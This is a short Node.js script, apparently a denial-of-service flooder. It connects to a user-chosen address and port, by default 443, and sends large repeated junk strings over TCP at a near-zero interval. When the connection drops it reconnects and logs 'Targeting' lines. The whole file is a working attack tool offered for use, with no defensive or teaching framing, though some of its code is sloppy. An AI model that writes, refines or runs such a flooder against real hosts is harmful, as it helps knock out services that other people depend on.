const net = require('net');
const crypto = require("crypto")
var argv = require('minimist')(process.argv.slice(2), {"--": true});

if(!argv || !argv["a"]) {
  process.stdout.write(`
ERROR. Not enough arguments
---------------------------
-a <addr> | Specify where to connect (address/IP). REQUIRED!
-p <port> | Port. OPTIONAL
-i <ms>   | Request interval. OPTIONAL
`)
}

function spam() {
  console.log('Connected');
  let i = 1
  globalThis.thread = 1
  setInterval(() => {
    process.stdout.write(`[T${globalThis.thread}] #${i} Request\n`)
    i++
    let datetime = Date.now().toString(11).repeat(16900)
    client.write(crypto.createHash('sha256', datetime).toString().repeat(5000))
  }, argv["i"] | 0.001)
}

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
const TARGET = {
  ADDR: argv["a"],
  PORT: parseInt(argv["p"]) | 443
} 

var client = new net.Socket();
client.connect(TARGET.PORT, TARGET.ADDR, spam);

client.once('ready', () => {
  console.log("Client Ready!")
  console.log("Targeting " + TARGET.ADDR + ":" + TARGET.PORT)
  sleep(5E3)
})

client.on('error', function(data) {
  globalThis.thread++
  client.connect(TARGET.PORT, TARGET.ADDR, spam)
})

client.on("data", function(d) {
  console.log("Something happends! " + d)
})

client.setMaxListeners(50)